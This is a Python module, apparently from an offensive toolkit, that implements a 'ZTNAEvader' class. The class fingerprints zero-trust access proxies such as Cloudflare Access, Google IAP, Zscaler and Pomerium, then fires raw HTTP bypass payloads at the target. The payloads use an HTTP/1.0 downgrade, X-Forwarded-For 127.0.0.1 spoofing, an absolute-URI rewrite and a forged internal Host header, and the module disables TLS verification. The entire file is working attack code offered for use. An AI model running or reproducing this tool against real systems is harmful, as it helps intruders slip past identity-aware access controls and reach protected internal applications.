import socket
import ssl
import logging
import time

logger = logging.getLogger("usare.ztna_evader")

class ZTNAEvader:
    """
    Zero-Trust Network Access (ZTNA) / Identity Aware Proxy (IAP) Evasion.
    Detects Cloudflare Access, Google IAP, Zscaler, or Pomerium boundaries.
    Attempts architectural bypasses via Host header manipulation, X-Forwarded-For 
    spoofing, and HTTP/1.0 downgrade to bypass strict proxy routing rules.
    """
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout
        
    def _detect_ztna(self, headers: dict, body: str) -> str:
        body_lower = body.lower()
        if "cloudflare access" in body_lower or "cf-access" in headers:
            return "Cloudflare Access"
        if "google_iap" in body_lower or "x-goog-iap" in headers:
            return "Google IAP"
        if "zscaler" in body_lower or "forwarded-by-zscaler" in headers:
            return "Zscaler ZPA"
        if "pomerium" in body_lower or "x-pomerium" in headers:
            return "Pomerium"
        if "identity-aware" in body_lower:
            return "Generic IAP"
        return None

    def probe_and_evade(self, target_ip: str, port: int) -> dict:
        results = {
            "ztna_detected": None,
            "bypassed": False,
            "bypass_method": None,
            "latency_ms": 0.0,
            "intel": {}
        }
        
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        start_time = time.time()
        
        # 1. Baseline Request (Expect 302 / 401 / 403 ZTNA Redirect)
        base_req = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            if port in (443, 8443, 4443):
                conn = ctx.wrap_socket(sock, server_hostname=target_ip)
            else:
                conn = sock
                
            conn.connect((target_ip, port))
            conn.sendall(base_req)
            resp = conn.recv(4096).decode('utf-8', errors='ignore')
            conn.close()
            
            headers = {}
            body = ""
            if "\r\n\r\n" in resp:
                head_str, body = resp.split("\r\n\r\n", 1)
                for line in head_str.split("\r\n")[1:]:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        headers[k.strip().lower()] = v.strip()
                        
            ztna_type = self._detect_ztna(headers, body)
            if not ztna_type:
                # Target is not protected by an obvious ZTNA
                results["latency_ms"] = (time.time() - start_time) * 1000
                return results
                
            results["ztna_detected"] = ztna_type
            
            # 2. Attempt Bypasses
            bypass_payloads = [
                # HTTP/1.0 Downgrade (bypasses some SNI/Host routing)
                (b"GET / HTTP/1.0\r\n\r\n", "HTTP/1.0 Downgrade"),
                # X-Forwarded-For Internal Spoof
                (f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\n".encode(), "X-Forwarded-For Spoof"),
                # Absolute URI Manipulation
                (f"GET https://127.0.0.1/ HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n".encode(), "Absolute URI Spoof"),
                # Host Header Override
                (f"GET / HTTP/1.1\r\nHost: internal.local\r\nConnection: close\r\n\r\n".encode(), "Internal Host Header")
            ]
            
            for payload, method in bypass_payloads:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                if port in (443, 8443, 4443):
                    conn = ctx.wrap_socket(sock, server_hostname=target_ip)
                else:
                    conn = sock
                conn.connect((target_ip, port))
                conn.sendall(payload)
                bp_resp = conn.recv(4096).decode('utf-8', errors='ignore')
                conn.close()
                
                # Check if we bypassed the 302/401 gateway and hit the 200 OK backend app
                if "HTTP/1.1 200 OK" in bp_resp or "HTTP/1.0 200 OK" in bp_resp:
                    if ztna_type.lower() not in bp_resp.lower():  # Ensure it isn't just a 200 OK from the ZTNA block page
                        results["bypassed"] = True
                        results["bypass_method"] = method
                        results["intel"]["backend_response"] = bp_resp[:200].replace("\r\n", " ")
                        break

        except Exception as e:
            results["intel"]["error"] = str(e)
            
        results["latency_ms"] = (time.time() - start_time) * 1000
        return results
